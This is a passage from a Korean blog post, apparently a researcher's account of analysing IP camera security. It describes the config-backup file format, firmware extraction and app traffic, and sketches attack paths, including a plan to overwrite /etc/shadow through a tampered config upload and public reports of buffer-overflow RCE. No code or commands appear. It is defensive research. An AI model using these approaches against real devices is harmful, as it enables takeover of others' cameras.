href="#2&#xC5D0;&#xC11C;-&#xBD84;&#xC11D;&#xD55C;-4&#xAC00;&#xC9C0;-&#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xC5D0;-&#xB300;&#xD574;-&#xC548;&#xC804;&#xD55C;-&#xC554;&#xD638;&#xD654;-&#xBC29;&#xBC95;&#xC744;-&#xC801;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;-&#xCC98;&#xC74C;&#xBD80;&#xD130;-&#xC774;&#xB807;&#xAC8C;-&#xC124;&#xACC4;&#xD588;&#xC744;-&#xAC70;&#xB77C;&#xACE0;&#xB294;-&#xC808;&#xB300;-&#xC0DD;&#xAC01;&#xD558;&#xC9C0;-&#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;" class="headerlink" title="2&#xC5D0;&#xC11C; &#xBD84;&#xC11D;&#xD55C; 4&#xAC00;&#xC9C0; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xC5D0; &#xB300;&#xD574; &#xC548;&#xC804;&#xD55C; &#xC554;&#xD638;&#xD654; &#xBC29;&#xBC95;&#xC744; &#xC801;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xC774;&#xB807;&#xAC8C; &#xC124;&#xACC4;&#xD588;&#xC744; &#xAC70;&#xB77C;&#xACE0;&#xB294; &#xC808;&#xB300; &#xC0DD;&#xAC01;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.."></a>2&#xC5D0;&#xC11C; &#xBD84;&#xC11D;&#xD55C; 4&#xAC00;&#xC9C0; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xC5D0; &#xB300;&#xD574; &#xC548;&#xC804;&#xD55C; &#xC554;&#xD638;&#xD654; &#xBC29;&#xBC95;&#xC744; &#xC801;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xC774;&#xB807;&#xAC8C; &#xC124;&#xACC4;&#xD588;&#xC744; &#xAC70;&#xB77C;&#xACE0;&#xB294; &#xC808;&#xB300; &#xC0DD;&#xAC01;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;..</h1></li><li>BOF &#xAD00;&#xB828; length &#xAC80;&#xC99D;&#xC774; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xCCA0;&#xC800;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p><img src="image%207.png" alt="image.png"></p><hr><h1 id="Target-B"><a href="#Target-B" class="headerlink" title="Target B"></a>Target B</h1><h2 id="1-Initial-exploration-1"><a href="#1-Initial-exploration-1" class="headerlink" title="#1 - Initial exploration"></a>#1 - Initial exploration</h2><p> Target B&#xC758; &#xC0AC;&#xC6A9;&#xC790; interface&#xC5D0;&#xB294; App (iOS / Android)&#xC640; Windows EXE&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Windows EXE&#xC758; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xBD84;&#xC11D;&#xC744; &#xC218;&#xD589;&#xD558;&#xB2E4; IP CAM&#xC758; IP &#xC8FC;&#xC18C;&#xC5D0; Web Interface&#xB97C; &#xCD94;&#xAC00;&#xB85C; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>App<ul><li>&#xC81C;&#xD488; &#xC0AC;&#xC6A9;&#xC124;&#xBA85;&#xC11C;&#xC5D0; &#xCD08;&#xAE30; &#xC124;&#xC815;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xBD80;&#xBD84;&#xC774; &#xAF64;&#xB098; &#xCDE8;&#xC57D;&#xD574; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</li><li>App&#xC744; &#xD1B5;&#xD574; &#xAE30;&#xAE30;&#xB97C; &#xB4F1;&#xB85D;&#xD560; &#xB54C;&#xC5D0;&#xB294;, IP CAM&#xC758; Wi-Fi&#xC5D0; &#xBAA8;&#xBC14;&#xC77C; &#xAE30;&#xAE30;&#xAC00; &#xC811;&#xC18D;&#xD55C; &#xD6C4;&#xC5D0; &#xBAA8;&#xBC14;&#xC77C; &#xAE30;&#xAE30;&#xC5D0;&#xC11C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB358; Wi-Fi &#xC811;&#xC18D; &#xC815;&#xBCF4;&#xB97C; &#xB118;&#xACA8;&#xC8FC;&#xBA74; &#xCD08;&#xAE30; &#xB4F1;&#xB85D;&#xC774; &#xC644;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xAE30;&#xAE30; &#xB4F1;&#xB85D; &#xC644;&#xB8CC; &#xD6C4; &#xC601;&#xC0C1; &#xC2DC;&#xCCAD;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC601;&#xC0C1; &#xC2DC;&#xCCAD; &#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xB179;&#xD654;, &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC5C5;&#xB85C;&#xB4DC;, &#xCE74;&#xBA54;&#xB77C; &#xC0C1;&#xD558;&#xC88C;&#xC6B0; &#xC774;&#xB3D9;, &#xBC84;&#xC800;&#xC74C; &#xCD9C;&#xB825; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li>Windows EXE<ul><li>&#xB85C;&#xCEEC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xC788;&#xB294; &#xAE30;&#xAE30;&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xACE0; &#xB4F1;&#xB85D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xB9CE;&#xC740; &#xAE30;&#xB2A5;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>Web Interface<ul><li>IP CAM&#xC758; IP &#xC8FC;&#xC18C;&#xC5D0; &#xC5F4;&#xB824;&#xC788;&#xB294; CGI &#xAE30;&#xBC18; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;. &#xC6F9;&#xC0AC;&#xC774;&#xD2B8; &#xC811;&#xC18D;&#xC744; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB85C; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. UI&#xAC00; &#xD5C8;&#xC811;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xB9CE;&#xC544; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;!!</li><li>App&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC124;&#xC815; &#xD30C;&#xC77C; &#xBC31;&#xC5C5; / &#xB85C;&#xB4DC;, &#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xAE30;&#xB2A5;</strong>&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ul><h2 id="2-Web-Interface"><a href="#2-Web-Interface" class="headerlink" title="#2 - Web Interface"></a>#2 - Web Interface</h2><h3 id="2-1-System-configuration-backup-load"><a href="#2-1-System-configuration-backup-load" class="headerlink" title="#2.1 - System configuration backup / load"></a>#2.1 - System configuration backup / load</h3><p>Web interface&#xC5D0;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC744; &#xBC31;&#xC5C5;(IP CAM &#x2192; PC &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;)&#xD558;&#xACE0;, &#xB85C;&#xB4DC;(PC &#x2192; IP CAM)&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD30C;&#xC77C;&#xC758; &#xAD6C;&#xC870;&#xAC00; &#xC774;&#xB7AC;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Header (0x200)<ul><li>MD5 hash &#xC874;&#xC7AC;</li></ul></li><li>Body<ul><li>TAR &#xAD6C;&#xC870;</li></ul></li></ul><p>BODY &#xD544;&#xB4DC;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; TAR &#xAD6C;&#xC870;&#xC784;&#xC744; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; &#xCD94;&#xCD9C;&#xD574;&#xBCF4;&#xB2C8;, &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xCC98;&#xB7FC; &#xD30C;&#xC77C;&#xC758; &#xACBD;&#xB85C;&#xC640; &#xC6D0;&#xBCF8; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xAD6C;&#xC870;&#xB97C; &#xC218;&#xC815;&#xD574; <code>/etc/shadow</code> &#xACBD;&#xB85C;&#xC5D0; &#xB0B4;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB123;&#xC5B4;&#xC8FC;&#xBA74; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; overwrite&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC8E0;.</p><p><img src="image%208.png" alt="image.png"></p><p>&#xBB38;&#xC81C;&#xB294; MD5 hash&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE38;&#xC774;&#xAC00; MD5&#xC784;&#xC774; &#xBD84;&#xBA85;&#xD55C;&#xB370; &#xAC12;&#xC774; &#xC804;&#xD600; &#xB9DE;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB358; &#xC911;,, 2019&#xB144; &#xD55C; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C; MD5 &#xAC12;&#xC744; &#xB9DE;&#xCDB0; &#xB3D9;&#xC77C; IP CAM&#xC758; &#xB8E8;&#xD2B8; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xBCC0;&#xACBD;&#xD55C; &#xC0AC;&#xB840;&#xB97C; &#xC54C;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7F0; &#xC774;&#xB7F0;,,,, &#xC774;&#xBBF8; &#xB204;&#xAD70;&#xAC00; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC81C;&#xBCF4;&#xD574; &#xD328;&#xCE58;&#xB41C; &#xAC83;&#xC774; &#xD2C0;&#xB9BC; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F602; &#xC774;&#xD6C4; &#xD38C;&#xC6E8;&#xC5B4; &#xCD94;&#xCD9C; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xB354; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC9C0;&#xB9CC; MD5 hash &#xD544;&#xB4DC;&#xC758; &#xACC4;&#xC0B0;&#xBC95;&#xC740; &#xD574;&#xCEE4;&#xB4E4;&#xC758; &#xB178;&#xB825;&#xC5D0; &#xB530;&#xB77C; &#xACC4;&#xC18D;&#xD574;&#xC11C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="2-2-Firmware-update"><a href="#2-2-Firmware-update" class="headerlink" title="#2.2 - Firmware update"></a>#2.2 - Firmware update</h3><p>&#xC81C;&#xC870;&#xC0AC;&#xC758; &#xD648;&#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xBD84;&#xBA85; &#xBAA8;&#xB450;&#xAC00; &#xC544;&#xB294; ZIP &#xAD6C;&#xC870;&#xC778;&#xB370;&#xB3C4; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC555;&#xCD95; &#xD574;&#xC81C;&#xAC00; &#xB418;&#xC9C0; &#xC54A;&#xC544; &#xC0B4;&#xD3B4;&#xBCF4;&#xB2C8; &#xAD6C;&#xC870;&#xC5D0; &#xC77C;&#xBD80; customization&#xB41C; &#xBD80;&#xBD84;&#xC774; &#xC874;&#xC7AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>ZIP &#xAD6C;&#xC870;&#xC5D0; &#xB9DE;&#xCDB0; &#xB530;&#xB77C;&#xAC00;&#xBA74;&#xC11C; &#xADDC;&#xCE59;&#xC744; &#xD30C;&#xC545;&#xD574; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC77C;&#xBD80; &#xC218;&#xC815;&#xD574;&#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xACB0;&#xACFC; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xB294; &#xB370;&#xC5D0; &#xC131;&#xACF5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4; (&#xC77C;&#xBD80; &#xC5D0;&#xB7EC;&#xAC00; &#xBC1C;&#xC0DD;&#xD574; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C; &#xCD94;&#xCD9C;&#xC740; &#xD798;&#xB4E4;&#xC5C8;&#xC8E0;)</p><p><img src="image%209.png" alt="[https://blog.forensicresearch.kr/3](https://blog.forensicresearch.kr/3)"></p><p><a href="https://blog.forensicresearch.kr/3">https://blog.forensicresearch.kr/3</a></p><p>&#xADF8;&#xB7EC;&#xB358; &#xC911;,, &#xC81C;&#xC870;&#xC0AC; &#xD648;&#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xD604;&#xC7AC;&#xBD80;&#xD130; &#xACFC;&#xAC70;&#xAE4C;&#xC9C0; &#xD38C;&#xC6E8;&#xC5B4; &#xBAA8;&#xC74C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC800;&#xD76C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>ZIP &#xAD6C;&#xC870; &#xD30C;&#xC545;<ul><li>ZIP &#xAD6C;&#xC870;&#xC5D0; &#xB9DE;&#xCDB0; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xBCC0;&#xACBD;&#xD574;&#xAC00;&#xBA70; &#xD38C;&#xC6E8;&#xC5B4; &#xCD94;&#xCD9C;</li></ul></li><li>&#xBA54;&#xC778; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB9AC;&#xBC84;&#xC2F1;<ul><li>System config &#xD30C;&#xC77C;(firmware&#xC640; &#xAD6C;&#xC870; &#xAC19;&#xC74C;) &#xC0DD;&#xC131; &#xB85C;&#xC9C1; &#xB9AC;&#xBC84;&#xC2F1;&#xD574; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D; &#xCD94;&#xC801;</li></ul></li></ul><p><img src="b6c855a3-b38e-402f-bffd-ea5f99fa942b.png" alt="image.png"></p><p>&#xBD84;&#xC11D; &#xACB0;&#xACFC; &#xD38C;&#xC6E8;&#xC5B4; &#xBC84;&#xC804;&#xC774; &#xC62C;&#xB77C;&#xAC00;&#xBA74;&#xC11C; &#xBC14;&#xB010; &#xC810;&#xB4E4;&#xC744; &#xC54C;&#xC544;&#xB0BC; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBCC0;&#xACBD; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC5BC;&#xB9C8;&#xB098; &#xB9CE;&#xC740; &#xD574;&#xCEE4;&#xAC00; &#xCC38;&#xC5EC;&#xD588;&#xC744;&#xC9C0; &#xB290;&#xB084; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.. &#xADF8;&#xC800; &#xBD80;&#xB7FD;&#xB124;&#xC694;&#x2026;</p><ul><li>ZIP &#xD30C;&#xC77C; &#xAD6C;&#xC870; &#xBCC0;&#xACBD;<ul><li>&#xCD08;&#xAE30;&#xC5D0;&#xB294; &#xD30C;&#xC77C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB97C; &#xB2E8;&#xC21C; &#xBCC0;&#xACBD;&#xD574; &#xC54C;&#xC544;&#xBCFC; &#xC218; &#xC5C6;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC73C;&#xB098;, &#xC911;&#xAC04;&#xC5D0;&#xB294; &#xD30C;&#xC77C;&#xC758; &#xC77C;&#xBD80;&#xBD84;&#xC744; &#xBD80;&#xBD84; &#xC554;&#xD638;&#xD654;&#xD588;&#xACE0;, &#xD604;&#xC7AC;&#xB294; &#xD30C;&#xC77C; &#xC804;&#xCCB4;&#xAC00; &#xC554;&#xD638;&#xD654;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC784;</li></ul></li><li>MD5 hash &#xC0DD;&#xC131; &#xB85C;&#xC9C1;<ul><li>&#xCD08;&#xAE30;&#xC5D0;&#xB294; <code>MD5(BODY)</code> &#xD615;&#xD0DC;&#xC600;&#xC73C;&#xB098;, <code>MD5(BODY + &quot;secret string&quot;)</code> &#xD615;&#xD0DC;&#xB85C; &#xBC14;&#xB00C;&#xACE0;, &#xD604;&#xC7AC;&#xB294; &#xC5B4;&#xB5BB;&#xAC8C; &#xC0DD;&#xC131;&#xD558;&#xB294;&#xC9C0; &#xC54C; &#xC218; &#xC5C6;&#xC74C;</li></ul></li><li>&#xD38C;&#xC6E8;&#xC5B4; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; &#xC704;&#xCE58;<ul><li>2017&#xB144;&#xBD80;&#xD130; 2021&#xB144;&#xAE4C;&#xC9C0; &#xD38C;&#xC6E8;&#xC5B4;&#xB294; &#xD648;&#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC; &#xB418;&#xC5C8;&#xC73C;&#xB098;, &#xADF8; &#xC774;&#xD6C4;&#xC5D0;&#xB294; App&#xACFC; &#xC5F0;&#xB3D9;&#xB418;&#xB294; &#xBC31;&#xC5D4;&#xB4DC; &#xC5B4;&#xB518;&#xAC00;&#xB85C; &#xC5C5;&#xB85C;&#xB4DC;&#xB428;</li></ul></li></ul><h2 id="3-App"><a href="#3-App" class="headerlink" title="#3 - App"></a>#3 - App</h2><p>Android &#xB8E8;&#xD305; &#xD3F0;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC9C0; &#xC54A;&#xC558;&#xB358; &#xAD00;&#xACC4;&#xB85C;, App &#xBD84;&#xC11D;&#xC740; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC218;&#xC900;&#xC5D0;&#xC11C;&#xB9CC; &#xC9C4;&#xD589;&#xD588;&#xC5B4;&#xC694;. &#xADC0;&#xCC2E;&#xC544;&#xC11C; &#xC548; &#xD55C;&#xAC8C; &#xB9DE;&#xAE34; &#xD569;&#xB2C8;&#xB2E4;..^^ iPhone&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD328;&#xD0B7; &#xCEA1;&#xCCD0;&#xB97C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC218;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xAD6C;&#xAE00;&#xC5D0; &#xAC80;&#xC0C9;&#xD574;&#xBCF4;&#xB2C8; &#xB9E5;&#xBD81;&#xACFC; iPhone&#xC744; &#xC5F0;&#xACB0;&#xD558;&#xBA74; iPhone &#xD328;&#xD0B7; &#xCEA1;&#xCCD0;&#xAC00; &#xAC00;&#xB2A5;&#xD588;&#xC5B4;&#xC694;</li></ul><p><img src="image%2010.png" alt="[https://lxxyeon.tistory.com/157](https://lxxyeon.tistory.com/157)"></p><p><a href="https://lxxyeon.tistory.com/157">https://lxxyeon.tistory.com/157</a></p><p>iPhone &#xC5D0;&#xC11C; &#xC218;&#xC9D1;&#xD55C; &#xD328;&#xD0B7;&#xC744; &#xBD84;&#xC11D;&#xD574; &#xD30C;&#xC545;&#xD55C; IP CAM&#xACFC;&#xC758; &#xD1B5;&#xC2E0; &#xACFC;&#xC815;&#xC740; &#xC774;&#xB7AC;&#xC5B4;&#xC694;.</p><ul><li>IP CAM&#xC758; &#xC804;&#xC6D0;&#xC774; &#xCF1C;&#xC9C0;&#xBA74; server&#xC640; &#xC8FC;&#xAE30;&#xC801;&#xC73C;&#xB85C; &#xD1B5;&#xC2E0;&#xD574;&#xC694;. IP CAM&#xC740; &#xC790;&#xC2E0;&#xC758; IP &#xC640; &#xC811;&#xC18D; &#xAC00;&#xB2A5;&#xD55C; &#xD3EC;&#xD2B8; &#xC815;&#xBCF4;&#xB97C; server&#xC5D0; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. &#xD3EC;&#xD2B8; &#xC815;&#xBCF4;&#xAC00; 1&#xBD84;&#xB9C8;&#xB2E4; &#xBC14;&#xB00C;&#xC5B4;&#xC694;.</li><li>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; App&#xC744; &#xCF1C;&#xBA74; server&#xC5D0; communication request&#xB97C; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xBC1B;&#xC740; &#xC11C;&#xBC84;&#xB294; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; IP / port &#xC815;&#xBCF4;&#xB85C; IP CAM&#xC5D0; communicaiton request&#xB97C; &#xBCF4;&#xB0B4;&#xC8E0;. &#xC5EC;&#xAE30;&#xC5D0;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; IP / port &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB3FC;&#xC694;.<ul><li>IP CAM&#xC740; &#xC815;&#xBCF4;&#xB97C; &#xBC1B;&#xC544; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC5F0;&#xACB0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.</li></ul></li></ul><p><img src="image%2011.png" alt="image.png"></p><p>Target B&#xC5D0; &#xB300;&#xD574; &#xBE14;&#xB85C;&#xADF8;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xACF5;&#xACA9; &#xC0AC;&#xB840;&#xB97C; &#xBCF4;&#xBA74;, &#xADF8;&#xB4E4;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC21C;&#xC11C;&#xB85C; &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xD50C;&#xB798;&#xC2DC; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xCE69;&#xC624;&#xD504;&#xD558;&#xACE0;, &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xB364;&#xD504;&#xD568;</li><li>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xACE0; BOF &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD568;</li><li>RCE&#xB97C; &#xD1B5;&#xD574; &#xC258;&#xC744; &#xD68D;&#xB4DD;&#xD568;</li></ul><p><img src="image%2012.png" alt="image.png"></p><p>&#xB9CC;&#xC57D; &#xC6B0;&#xB9AC;&#xAC00; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xB2E4;&#xC2DC; IP CAM&#xC744; &#xBD84;&#xC11D;&#xD55C;&#xB2E4;&#xBA74; &#xADF8;&#xB4E4;&#xACFC; &#xAC19;&#xC774; &#xD50C;&#xB798;&#xC2DC; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xB294; &#xC791;&#xC5C5;&#xBD80;&#xD130; &#xC218;&#xD589;&#xD588;&#xC744; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xD38C;&#xC6E8;&#xC5B4; &#xD655;&#xBCF4;&#xD558;&#xACE0; &#xB3D9;&#xC801; &#xB514;&#xBC84;&#xAE45;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xD658;&#xACBD;&#xC744; &#xAC00;&#xC9C0;&#xB294; &#xAC83;&#xC774; &#xBB34;&#xC5C7;&#xBCF4;&#xB2E4; &#xC911;&#xC694;&#xD568;&#xC744; &#xC54C;&#xAC8C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC815;&#xB9D0;&#xB85C;, &#xC815;&#xB9D0;&#xB85C; &#xC774;&#xAC8C; &#xC81C;&#xC77C; &#xC911;&#xC694;&#xD574;&#xC694;..</li></ul><h2 id="4-Windows-EXE"><a href="#4-Windows-EXE" class="headerlink" title="#4 - Windows EXE"></a>#4 - Windows EXE</h2><p>Windows EXE&#xB294; &#xB85C;&#xC9C1;&#xC740; &#xB2E8;&#xC21C;&#xD588;&#xC9C0;&#xB9CC;, &#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xC758; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xC810;&#xC740; App&#xACFC; Windows EXE&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC774; &#xC804;&#xD600; &#xB2EC;&#xB790;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;. IP CAM&#xC774; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC774; &#xB108;&#xBB34;&#xB098; &#xB2E4;&#xC591;&#xD574; &#xC798; &#xCC3E;&#xAE30;&#xB9CC; &#xD55C;&#xB2E4;&#xBA74; &#xAF64;&#xB098; &#xB9CE;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xB098;&#xC62C; &#xC218; &#xC788;&#xC744; &#xB4EF;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%2013.png" alt="image.png"></p><hr><h1 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h1><p>&#xC800;&#xB294; &#xC57D; 3&#xB2EC;(24.11 ~ 25.1)&#xC5D0; &#xAC78;&#xCCD0; &#xC774; &#xAE00;&#xC5D0; &#xC18C;&#xAC1C;&#xD55C; IP CAM 2&#xAC1C;&#xB97C; &#xD3EC;&#xD568;&#xD574; &#xC57D; 4&#xAC1C;&#xC758; IP CAM&#xC744; &#xBD84;&#xC11D;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCC98;&#xC74C; &#xACBD;&#xD5D8;&#xD558;&#xB294; IoT &#xAE30;&#xAE30; &#xBD84;&#xC11D;&#xC774;&#xB77C; &#xBBF8;&#xD761;&#xD55C; &#xC810;&#xC774; &#xB9CE;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C;&#xB85C; Windows EXE &#xBD84;&#xC11D;&#xACFC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xBD84;&#xC11D;&#xC740; &#xB9CE;&#xC774; &#xD574;&#xBCF4;&#xC9C0; &#xC54A;&#xC740; &#xAC83;&#xC774;&#xB77C; &#xAF64;&#xB098; &#xC5B4;&#xC0C9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC;&#xC5D0;&#xB3C4; &#xC81C;&#xAC00; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xBC30;&#xC6B4; &#xC810;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xB9CE;&#xC774; 